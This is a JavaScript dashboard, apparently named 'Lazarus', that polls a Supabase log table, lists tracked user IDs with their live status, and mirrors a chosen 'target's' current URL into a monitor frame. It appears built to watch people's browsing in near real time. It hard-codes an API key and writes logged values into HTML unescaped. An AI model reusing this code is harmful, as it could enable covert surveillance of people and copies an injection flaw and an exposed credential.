const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs"; // Pon tu key de Supabase

let selectedNode = null;

async function syncLazarusNodes() {
    try {
        // Obtenemos logs recientes (últimos 30 segundos)
        const timeLimit = new Date(Date.now() - 30000).toISOString();
        
        const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=100`, {
            headers: { 'apikey': SB_KEY }
        });
        const data = await res.json();

        // Agrupar por ID único para que no salgan repetidos
        const nodesMap = new Map();
        data.forEach(log => {
            if (!nodesMap.has(log.usuario_id)) {
                nodesMap.set(log.usuario_id, log);
            }
        });

        const listUI = document.getElementById('nodes');
        const nodes = Array.from(nodesMap.values());
        
        document.getElementById('user-count').innerText = nodes.length;

        if(nodes.length === 0) {
            listUI.innerHTML = "<p style='color:#444; padding:20px;'>Buscando señales...</p>";
        } else {
            listUI.innerHTML = nodes.map(n => `
                <div class="user-node ${selectedNode === n.usuario_id ? 'active' : ''}" onclick="setTarget('${n.usuario_id}')">
                    <div class="status-pulse" style="background:${isOnline(n.timestamp) ? 'lime' : 'red'}"></div>
                    <b>${n.usuario_id}</b><br>
                    <small style="font-size:9px; opacity:0.6">${n.url_actual.substring(0,30)}...</small>
                </div>
            `).join('');
        }

        // Si tenemos un nodo seleccionado, actualizamos su pantalla
        if (selectedNode) {
            const activeData = nodesMap.get(selectedNode);
            if (activeData) {
                document.getElementById('monitor').src = activeData.url_actual;
            }
        }
    } catch (e) { console.error("Error de red Lazarus"); }
}

function isOnline(ts) {
    const last = new Date(ts).getTime();
    const now = new Date().getTime();
    return (now - last) < 15000; // Si el último log fue hace menos de 15 seg, está verde
}

function setTarget(id) {
    selectedNode = id;
    document.getElementById('target-info').innerText = "Vigilando: " + id;
    syncLazarusNodes();
}

// Sincronización rápida cada 3 segundos
setInterval(syncLazarusNodes, 3000);
